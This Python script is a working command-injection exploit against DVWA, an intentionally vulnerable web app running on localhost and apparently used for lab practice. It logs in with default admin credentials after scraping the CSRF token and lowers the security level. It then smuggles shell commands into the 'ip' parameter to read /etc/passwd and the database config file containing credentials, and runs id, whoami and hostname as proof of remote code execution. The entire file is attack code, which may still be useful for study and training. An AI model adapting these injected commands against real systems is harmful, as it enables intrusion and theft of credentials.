
import requests
import re

session = requests.Session()

# Step 1: Get login page and CSRF token
print("[*] Step 1: Fetching login page...")
login_page = session.get('http://localhost:28080/login.php')
csrf_match = re.search(r"user_token'\s+value='(\w+)'", login_page.text)
if not csrf_match:
    print("[-] Could not find CSRF token!")
    exit(1)
csrf_token = csrf_match.group(1)
print(f"[+] CSRF token: {csrf_token}")
print(f"[+] Session cookie: {session.cookies.get('PHPSESSID', 'none')}")

# Step 2: Login with CSRF token
print("\n[*] Step 2: Logging in as admin/password...")
login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': csrf_token
}
# Set security level to low
session.cookies.set('security', 'low', domain='localhost')
login_resp = session.post('http://localhost:28080/login.php', data=login_data, allow_redirects=True)
print(f"[+] Login response status: {login_resp.status_code}, URL: {login_resp.url}")
print(f"[+] Session cookie: {session.cookies.get('PHPSESSID', 'none')}")

# Step 3: Verify we're logged in
print("\n[*] Step 3: Verifying authentication...")
check = session.get('http://localhost:28080/index.php')
if 'Logout' in check.text:
    print("[+] AUTHENTICATED! Logged in successfully.")
else:
    print("[-] Login may have failed. Response snippet:")
    print(check.text[:500])

# Step 4: Command injection - read /etc/passwd
print("\n[*] Step 4: COMMAND INJECTION - cat /etc/passwd")
inject_params = {
    'ip': '127.0.0.1;cat /etc/passwd',
    'Submit': 'Submit'
}
inject_resp = session.get('http://localhost:28080/vulnerabilities/exec/', params=inject_params)
# Extract the output area
output_match = re.search(r'<pre>(.*?)</pre>', inject_resp.text, re.DOTALL)
if output_match:
    print(f"[+] RCE OUTPUT:\n{output_match.group(1)}")
else:
    print("[-] No output found. Checking full response...")
    print(inject_resp.text[:1500])

# Step 5: Command injection - read DVWA database config
print("\n[*] Step 5: COMMAND INJECTION - cat config.inc.php (DB creds)")
inject_params2 = {
    'ip': '127.0.0.1;cat /var/www/html/config/config.inc.php',
    'Submit': 'Submit'
}
inject_resp2 = session.get('http://localhost:28080/vulnerabilities/exec/', params=inject_params2)
output_match2 = re.search(r'<pre>(.*?)</pre>', inject_resp2.text, re.DOTALL)
if output_match2:
    print(f"[+] DB CONFIG:\n{output_match2.group(1)}")
else:
    print("[-] No config output. Checking...")
    print(inject_resp2.text[:1500])

# Step 6: Run id to confirm RCE
print("\n[*] Step 6: COMMAND INJECTION - id (proof of RCE)")
inject_params3 = {
    'ip': '127.0.0.1;id;whoami;hostname',
    'Submit': 'Submit'
}
inject_resp3 = session.get('http://localhost:28080/vulnerabilities/exec/', params=inject_params3)
output_match3 = re.search(r'<pre>(.*?)</pre>', inject_resp3.text, re.DOTALL)
if output_match3:
    print(f"[+] RCE PROOF:\n{output_match3.group(1)}")
else:
    print("[-] No output.")
    print(inject_resp3.text[:1500])

